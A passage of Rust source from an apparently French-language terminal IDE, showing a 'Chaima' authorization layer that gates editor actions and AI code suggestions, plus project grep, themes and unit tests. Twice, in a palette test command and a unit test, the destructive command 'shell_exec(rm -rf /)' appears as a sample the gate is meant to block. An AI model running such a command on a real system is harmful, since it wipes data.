        self.ensure_tab();
        let row = self.tabs[self.active].cursor.row;
        self.tabs[self.active].buffer.insert_newline(row, 0);
        self.tabs[self.active].cursor.row = row;
        self.tabs[self.active].cursor.col = 0;
        self.mode = Mode::Insert;
    }

    // ── CHAIMA : commandes souveraines ──────────────────────────────────

    fn cmd_chaima_test(&mut self) {
        let v1 = self.chaima.evaluate_action("buffer_insert(x)", "test palette");
        let v2 = self.chaima.evaluate_action("shell_exec(rm -rf /)", "test palette");
        self.push_output(format!(
            "[CHAIMA-TEST] buffer_insert(x) → {} | shell_exec(rm -rf /) → {}",
            if v1.is_authorized() { "AUTORISÉ ✓" } else { "ZÉRO-PATH ⊘" },
            if v2.is_authorized() { "AUTORISÉ ✓" } else { "ZÉRO-PATH ⊘" },
        ));
        self.panel_tab = PanelTab::Output;
        self.panel_visible = true;
        self.status_message = "Test Chaima : 2 actions évaluées — voir SORTIE".to_string();
    }

    fn cmd_chaima_chain(&mut self) {
        let total = self.chaima.intent_chain().len();
        let entries: Vec<(u64, String, String)> = self
            .chaima
            .intent_chain()
            .last_n(10)
            .iter()
            .rev()
            .map(|i| (i.id, i.action.clone(), i.current_hash.clone()))
            .collect();
        self.push_output(format!("── CHAÎNE D'INTENTIONS ({} entrées, SHA256) ──", total));
        for (id, action, hash) in entries {
            self.push_output(format!(
                "  #{} {:<36} {}",
                id,
                &action[..action.len().min(36)],
                &hash[..12.min(hash.len())]
            ));
        }
        self.panel_tab = PanelTab::Chaima;
        self.panel_visible = true;
    }

    fn cmd_llm_suggest(&mut self) {
        let context = self
            .tab()
            .map(|t| t.buffer.full_text())
            .unwrap_or_default();
        let ctx_short: String = context.chars().take(200).collect();
        if !self.authorize("llm_suggest", "suggestion IA") {
            return;
        }
        let suggestion = self.llm.suggest(&ctx_short, &mut self.chaima);
        self.push_output("── SUGGESTION IA (gate Chaima) ──".to_string());
        self.push_output(format!("  code : {}", suggestion.code));
        self.push_output(format!(
            "  verdict : {} — confiance {:.0}%",
            if suggestion.verdict.is_authorized() { "AUTORISÉ ✓" } else { "ZÉRO-PATH ⊘" },
            suggestion.confidence * 100.0
        ));
        if suggestion.verdict.is_authorized() {
            let (row, len) = {
                let t = &self.tabs[self.active];
                (t.cursor.row, t.buffer.line(t.cursor.row).len())
            };
            self.tabs[self.active].buffer.insert_newline(row, len);
            self.tabs[self.active].buffer.insert_str(row + 1, 0, &suggestion.code);
            self.push_output("  insérée sous le curseur (le modèle propose, la Loi a disposé)".to_string());
        } else {
            self.push_output("  rejetée par la couche souveraine — rien n'a été inséré".to_string());
        }
        self.panel_tab = PanelTab::Output;
        self.panel_visible = true;
    }

    fn cmd_llm_stats(&mut self) {
        let (g, a, r) = self.llm.stats();
        self.push_output(format!(
            "[LLM] {} générées · {} acceptées par Chaima · {} rejetées (Zéro-Path)",
            g, a, r
        ));
        self.panel_tab = PanelTab::Output;
        self.panel_visible = true;
    }

    fn cmd_prolog_demo(&mut self) {
        use crate::prolog::{KnowledgeBase, Parser, Term};
        self.push_output("── MOTEUR PROLOG NATIF ──".to_string());
        let program = r#"
            parent(tom, bob). parent(bob, alice). parent(bob, charlie). parent(alice, dave).
            ancestor(X, Y) :- parent(X, Y).
            ancestor(X, Z) :- parent(X, Y), ancestor(Y, Z).
        "#;
        let (clauses, _) = Parser::parse_program(program);
        let mut kb = KnowledgeBase::new();
        for clause in clauses {
            kb.add(clause);
        }
        let goal = Term::Struct(
            "ancestor".to_string(),
            vec![Term::Atom("tom".to_string()), Term::Var("Who".to_string())],
        );
        let solutions = kb.query(&goal);
        self.push_output(format!("  ancestor(tom, Who) → {} solution(s)", solutions.len()));
        for sol in &solutions {
            let who = sol
                .get("Who")
                .cloned()
                .unwrap_or_else(|| Term::Atom("?".to_string()))
                .substitute(sol)
                .to_string();
            self.push_output(format!("    Who = {}", who));
        }
        self.panel_tab = PanelTab::Output;
        self.panel_visible = true;
    }

    // ── GREP PROJET ─────────────────────────────────────────────────────

    pub fn cmd_grep(&mut self, query: &str) {
        if !self.authorize("grep_project", "recherche projet") {
            return;
        }
        self.grep_query = query.to_string();
        self.grep_hits.clear();
        self.grep_selected = 0;
        let q = query.to_lowercase();
        let mut files_scanned = 0usize;
        self.walk_grep(&self.project_root.clone(), &q, &mut files_scanned);
        let hits = self.grep_hits.len();
        self.push_output(format!(
            "[GREP] « {} » → {} correspondance(s) dans {} fichiers scannés",
            query, hits, files_scanned
        ));
        self.panel_tab = PanelTab::Search;
        self.panel_visible = true;
        if hits > 0 {
            self.jump_to_grep_hit(0);
        }
    }

    fn walk_grep(&mut self, dir: &PathBuf, q: &str, scanned: &mut usize) {
        if self.grep_hits.len() >= 200 {
            return;
        }
        let read = match std::fs::read_dir(dir) {
            Ok(r) => r,
            Err(_) => return,
        };
        let mut entries: Vec<_> = read.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        for entry in entries {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            if path.is_dir() {
                if name == ".git" || name == "target" || name == "__pycache__" {
                    continue;
                }
                self.walk_grep(&path, q, scanned);
            } else if path.metadata().map(|m| m.len() < 1_000_000).unwrap_or(false) {
                *scanned += 1;
                if let Ok(content) = std::fs::read_to_string(&path) {
                    for (i, line) in content.lines().enumerate() {
                        if line.to_lowercase().contains(q) {
                            self.grep_hits.push(GrepHit {
                                path: path.display().to_string(),
                                line_no: i + 1,
                                text: line.chars().take(120).collect(),
                            });
                            if self.grep_hits.len() >= 200 {
                                return;
                            }
                        }
                    }
                }
            }
        }
    }

    pub fn jump_to_grep_hit(&mut self, idx: usize) {
        let hit = match self.grep_hits.get(idx) {
            Some(h) => h.clone(),
            None => return,
        };
        self.grep_selected = idx;
        let path = PathBuf::from(&hit.path);
        if path.exists() {
            self.open_file_path(&path);
            let target = hit.line_no.saturating_sub(1);
            let max = self.tabs[self.active].buffer.line_count().saturating_sub(1);
            self.tabs[self.active].cursor.row = target.min(max);
            self.tabs[self.active].cursor.col = 0;
        }
    }

    pub fn cycle_grep_hit(&mut self, dir: i32) {
        if self.grep_hits.is_empty() {
            return;
        }
        let n = self.grep_hits.len() as i32;
        let cur = self.grep_selected as i32;
        let next = (cur + dir).rem_euclid(n) as usize;
        self.jump_to_grep_hit(next);
        self.status_message = format!(
            "correspondance {}/{} — {}:{}",
            next + 1,
            self.grep_hits.len(),
            self.grep_hits[next].path.rsplit('/').next().unwrap_or("?"),
            self.grep_hits[next].line_no
        );
    }

    // ── THÈMES ──────────────────────────────────────────────────────────

    pub fn set_theme(&mut self, name: ThemeName) {
        if !self.authorize("theme_change", &format!("thème {}", name.display_name())) {
            return;
        }
        self.theme_name = name;
        self.theme = Theme::get(name);
        self.status_message = format!("thème : {}", name.display_name());
        self.push_output(format!("[THEME] {}", name.display_name()));
    }

    pub fn cycle_theme(&mut self) {
        let next = Theme::next(self.theme_name);
        self.set_theme(next);
    }

    // ── Statistiques affichables ────────────────────────────────────────

    pub fn chaima_counts(&self) -> (u64, u64) {
        self.chaima.metrics()
    }
}

// ============================================================================
// HELPERS
// ============================================================================

pub fn resolve_path(arg: &str, root: &PathBuf) -> PathBuf {
    let p = PathBuf::from(arg);
    if p.is_absolute() {
        p
    } else {
        root.join(p)
    }
}

pub fn welcome_buffer() -> Buffer {
    let mut b = Buffer::new();
    b.lines = vec![
        "╔══════════════════════════════════════════════════════════════╗".to_string(),
        "║   NEXUS STUDIO v2.0 — IDE Souverain                          ║".to_string(),
        "║   Protocole Chaima Architect v1.0                            ║".to_string(),
        "╚══════════════════════════════════════════════════════════════╝".to_string(),
        String::new(),
        "   Le modèle propose, la Loi dispose.".to_string(),
        String::new(),
        "   ── POUR COMMENCER ─────────────────────────────────────".to_string(),
        "     Ctrl+P      palette de commandes (filtre flou)".to_string(),
        "     Ctrl+E      explorateur de fichiers".to_string(),
        "     Ctrl+L      tableau de bord souverain Chaima".to_string(),
        "     i / Esc     insertion / normal".to_string(),
        "     :           barre de commande (:w :q :e :grep :theme...)".to_string(),
        String::new(),
        "   ── RÈGLES ACTIVES ─────────────────────────────────────".to_string(),
        "     R1  Découplage Logique/Modèle".to_string(),
        "     R2  Zéro-Path : si non autorisé, l'action n'existe pas".to_string(),
        "     R3  Immunité architecturale (Prolog natif Rust)".to_string(),
        "     R4  Zéro-Delta Δ=0 (déterministe)".to_string(),
        "     R5  Souveraineté de l'intention (chaîne SHA256)".to_string(),
        String::new(),
    ];
    b.language = Language::Text;
    b
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_app_preload_and_authorize() {
        let mut app = App::new(None);
        // Pré-charge : 10 actions + 2 gate LLM = 12 intentions
        let (a, z) = app.chaima_counts();
        assert!(a >= 7, "autorisées pré-chargées, trouvé {}", a);
        assert!(z >= 5, "zeropath pré-chargées, trouvé {}", z);
        assert_eq!(app.chaima.intent_chain().len(), 12);

        // Une action interdite ne passe pas et incrémente zeropath
        let before = app.chaima_counts().1;
        assert!(!app.authorize("shell_exec(rm -rf /)", "test"));
        assert_eq!(app.chaima_counts().1, before + 1);
    }

    #[test]
    fn test_tabs_and_commands() {
        let mut app = App::new(None);
        app.ensure_tab();
        app.execute_command("e");
        assert_eq!(app.tabs.len(), 2);

        // goto ligne
        app.tabs[0].buffer = Buffer::from_text("l1\nl2\nl3", None);
        app.active = 0;
        app.execute_command("3");
        assert_eq!(app.tabs[app.active].cursor.row, 2);

        // :theme nord
        app.execute_command("theme nord");
        assert_eq!(app.theme_name, ThemeName::Nord);

        // :trim
        app.tabs[app.active].buffer.lines[0] = "hello   ".to_string();
        app.execute_command("trim");
        assert_eq!(app.tabs[app.active].buffer.lines[0], "hello");

        // :q ferme l'onglet
        let before = app.tabs.len();
        app.execute_command("q");
        assert_eq!(app.tabs.len(), before - 1);
    }

    #[test]
    fn test_find() {
        let mut app = App::new(None);
        app.ensure_tab();
        app.tabs[0].buffer = Buffer::from_text("alpha beta\ngamma alpha\n", None);
        app.last_find = Some("alpha".to_string());
        // Depuis (0,0), l'occurrence SUIVANTE est ligne 2, col 6
        app.find_occurrence(1);
        assert_eq!(app.tabs[0].cursor.row, 1);
        assert_eq!(app.tabs[0].cursor.col, 6);
        // Puis on boucle en tête de buffer (0,0)
        app.find_occurrence(1);
        assert_eq!(app.tabs[0].cursor.row, 0);
        assert_eq!(app.tabs[0].cursor.col, 0);
    }

    #[test]
    fn test_grep_project() {
        let mut app = App::new(None);
        // Cherche un mot garanti dans les sources embarquées du projet
        app.cmd_grep("souverain");
        // Pas d'assert strict sur le nombre : dépend du cwd — on vérifie juste
        // que la commande tourne et remplit la requête.
        assert_eq!(app.grep_query, "souverain");
    }
}
